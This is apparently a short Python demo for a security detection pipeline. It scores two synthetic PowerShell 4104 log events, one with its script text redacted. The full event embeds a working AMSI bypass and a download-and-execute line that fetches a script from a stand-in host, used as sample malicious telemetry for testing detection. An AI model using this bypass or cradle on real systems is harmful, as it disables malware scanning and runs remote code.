# examples/run_powershell_4104_demo.py
from dfs_core.pipeline import evaluate_event

GOLD = {
    "event": {"code": 4104},
    "host": {"name": "WS-0231"},
    "user": {"name": "jdoe"},
    "winlog": {
        "event_data": {
            "ScriptBlockText": r"""
$w = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $w.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
IEX (New-Object Net.WebClient).DownloadString('http://example.com/a.ps1')
"""
        }
    }
}

DEGRADED = {
    "event": {"code": 4104},
    "host": {"name": "WS-0231"},
    "user": {"name": "jdoe"},
    "winlog": {"event_data": {"ScriptBlockText": "[REDACTED_OR_MISSING]"}}
}

def main() -> None:
    for label, evt in [("GOLD", GOLD), ("DEGRADED", DEGRADED)]:
        res = evaluate_event(
            evt,
            kind="windows-powershell-4104",
            policy_path="policies/powershell_4104.policy.json"
        )
        print(f"\n=== {label} ===")
        print(res.card.to_dict())

if __name__ == "__main__":
    main()
